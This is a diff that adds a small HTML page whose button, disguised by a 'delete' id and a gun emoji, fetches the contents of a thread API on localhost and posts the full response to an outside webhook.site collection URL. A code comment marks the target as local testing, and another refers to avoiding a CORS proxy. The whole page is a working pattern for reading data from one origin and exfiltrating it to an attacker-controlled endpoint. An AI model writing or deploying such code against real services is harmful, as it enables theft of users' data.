@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"></hdad>
+<body>
+<div>
+<button id="delete">🔫</button>
+</div>
+<script>
+document.getElementById("delete").addEventListener("click", async () => {
+  const target = "http://localhost:3000/api/threads/";  // ローカルテスト用
+  const html = await fetch(target).then(r => r.text());  // ★AllOrigins不要
+
+  await fetch("https://webhook.site/68d0f25e-49c3-43e2-954e-d0e587510352", {
+    method: "POST",
+    headers: {"Content-Type": "text/plain"},
+    body: html
+  });
+});
+</script>
+</body>
+</html>
